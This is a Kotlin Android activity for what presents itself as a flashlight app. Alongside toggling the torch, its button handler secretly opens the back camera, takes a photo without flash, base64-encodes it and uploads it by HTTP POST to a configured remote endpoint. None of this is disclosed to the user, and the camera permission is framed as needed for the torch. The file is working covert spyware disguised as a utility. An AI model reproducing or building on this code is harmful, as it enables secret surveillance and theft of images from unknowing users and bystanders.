package com.example.flashlightapplication

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.View
import android.widget.Button
import android.graphics.Color
import android.widget.ImageView
import android.widget.Toast
import androidx.annotation.RequiresPermission
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.flashlightapplication.model.ImageUploadRequest
import kotlinx.serialization.InternalSerializationApi
import kotlinx.serialization.encodeToString
import org.json.JSONException
import java.net.HttpURLConnection
import java.net.URL
import java.io.IOException
import kotlin.concurrent.thread
import kotlinx.serialization.json.Json
import java.io.BufferedWriter
import java.io.OutputStreamWriter

class FlashLight : AppCompatActivity() {
    private var isFlashOn = false
    private lateinit var cameraManager: CameraManager
    private lateinit var cameraId: String
    private lateinit var cameraDevice: CameraDevice
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread
    private lateinit var imageReader: ImageReader

    private val CAMERA_PERMISSION_REQUEST_CODE = BuildConfig.CAMERA_PERMISSION_REQUEST_CODE
    private val API_ENDPOINT = BuildConfig.API_ENDPOINT
    private val TAG = BuildConfig.TAG

    companion object {
        const val IMAGE_WIDTH = BuildConfig.IMAGE_WIDTH
        const val IMAGE_HEIGHT = BuildConfig.IMAGE_HEIGHT
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        try {
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val hasFlash = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)

                if (hasFlash && lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id
                    break
                }
            }
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error accessing camera: ${e.message}")
        }

        val button = findViewById<Button>(R.id.flashlightButton)
        val rootLayout = findViewById<View>(R.id.rootLayout)
        val image = findViewById<ImageView>(R.id.backgroundImage)

        image.alpha = 0.0f

        button.setOnClickListener {
            if (!checkCameraPermission()) {
                requestCameraPermission()
                return@setOnClickListener
            }

            isFlashOn = !isFlashOn

            if (!isFlashOn) {
                startBackgroundThread()
                captureThenClose {
                    toggleFlashLight(true)
                    button.text = "Turn Off"
                    rootLayout.setBackgroundColor(Color.parseColor("#f9f9f8"))
                    image.alpha = 1.0f
                    stopBackgroundThread()
                }
            } else {
                toggleFlashLight(false)
                button.text = "Turn On"
                image.alpha = 0.0f
                rootLayout.setBackgroundColor(Color.BLACK)
            }
        }
    }

    private fun checkCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestCameraPermission() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.CAMERA),
            CAMERA_PERMISSION_REQUEST_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Camera permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Camera permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun toggleFlashLight(state: Boolean) {
        try {
            cameraManager.setTorchMode(cameraId, state)
        } catch (e: Exception) {
            Log.e(TAG, "Error toggling flashlight: ${e.message}")
            Toast.makeText(this, "Flashlight error: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground")
        backgroundThread.start()
        backgroundHandler = Handler(backgroundThread.looper)
    }

    private fun stopBackgroundThread() {
        if (::backgroundThread.isInitialized) {
            backgroundThread.quitSafely()
            try {
                backgroundThread.join()
            } catch (e: InterruptedException) {
                Log.e(TAG, "Error stopping background thread: ${e.message}")
            }
        }
    }

    @RequiresPermission(Manifest.permission.CAMERA)
    private fun captureThenClose(onDone: ()->Unit) {
        try {
            imageReader = ImageReader.newInstance(IMAGE_WIDTH, IMAGE_HEIGHT, ImageFormat.JPEG, 1).apply {
                setOnImageAvailableListener({ reader ->
                    reader.acquireLatestImage()?.use { img ->
                        val bytes = ByteArray(img.planes[0].buffer.remaining()).also {
                            img.planes[0].buffer.get(it)
                        }
                        uploadImage(bytes)
                    }
                }, backgroundHandler)
            }

            cameraManager.openCamera(cameraId, object: CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    takePictureWithoutFlash {
                        camera.close()
                        onDone()
                    }
                }
                override fun onDisconnected(c: CameraDevice){ c.close() }
                override fun onError(c: CameraDevice, e: Int){ c.close() }
            }, backgroundHandler)

        } catch (e: CameraAccessException) {
            Log.e(TAG, "capture failed", e)
            onDone()
        }
    }


    private fun takePictureWithoutFlash(onDone: () -> Unit) {
        try {
            val surface = imageReader.surface
            val builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(surface)
                set(CaptureRequest.CONTROL_AF_MODE,
                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.CONTROL_AE_MODE,
                    CaptureRequest.CONTROL_AE_MODE_ON)
                set(CaptureRequest.FLASH_MODE,
                    CaptureRequest.FLASH_MODE_OFF)
            }

            cameraDevice.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        session.capture(
                            builder.build(),
                            object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(
                                    session: CameraCaptureSession,
                                    request: CaptureRequest,
                                    result: TotalCaptureResult
                                ) {
                                    super.onCaptureCompleted(session, request, result)
                                    // close camera and invoke callback
                                    if (::cameraDevice.isInitialized) {
                                        cameraDevice.close()
                                    }
                                    onDone()
                                }
                            },
                            backgroundHandler
                        )
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Failed to configure camera capture session")
                        // still call onDone to avoid lockups
                        onDone()
                    }
                },
                backgroundHandler
            )
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error taking picture: ${e.message}", e)
            onDone()
        }
    }

    @OptIn(InternalSerializationApi::class)
    private fun uploadImage(imageData: ByteArray) {
        thread {
            var connection: HttpURLConnection? = null
            try {
                val base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP) // NO_WRAP prevents line breaks

                val uploadRequest = ImageUploadRequest(
                    image = base64Image,
                    timestamp = System.currentTimeMillis(),
                    deviceId = "camera_device"  // Remove spaces in identifiers
                )

                val jsonFormat = Json {
                    ignoreUnknownKeys = true
                    encodeDefaults = true
                }
                val payload = jsonFormat.encodeToString(ImageUploadRequest.serializer(), uploadRequest)
                Log.d(TAG, "Upload request created (payload length: ${payload.length})")

                val url = URL(API_ENDPOINT)
                connection = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("Accept", "application/json")
                    connectTimeout = 15_000
                    readTimeout = 15_000
                    doOutput = true
                    doInput = true
                }

                connection?.outputStream?.use { os ->
                    val writer = BufferedWriter(OutputStreamWriter(os, "UTF-8"))
                    writer.write(payload)
                    writer.flush()
                }

                val responseCode = connection?.responseCode
                Log.d(TAG, "Response code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    connection?.inputStream?.use { inputStream ->
                        val response = inputStream.bufferedReader().use { it.readText() }
                        Log.d(TAG, "Upload successful: $response")
                    }
                } else {
                    connection?.errorStream?.use { errorStream ->
                        val errorResponse = errorStream.bufferedReader().use { it.readText() }
                        Log.e(TAG, "Upload failed: $errorResponse")
                    }
                }
            } catch (e: IOException) {
                Log.e(TAG, "Network error in upload process", e)
                runOnUiThread {
                    Toast.makeText(this, "Network error: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
                }
            } catch (e: JSONException) {
                Log.e(TAG, "JSON error in upload process", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        if (isFlashOn) {
            try {
                toggleFlashLight(false)
                isFlashOn = false
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        if (::cameraDevice.isInitialized) {
            cameraDevice.close()
        }

        stopBackgroundThread()
    }

    override fun onResume() {
        super.onResume()
        if (isFlashOn) {
            try {
                toggleFlashLight(true)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
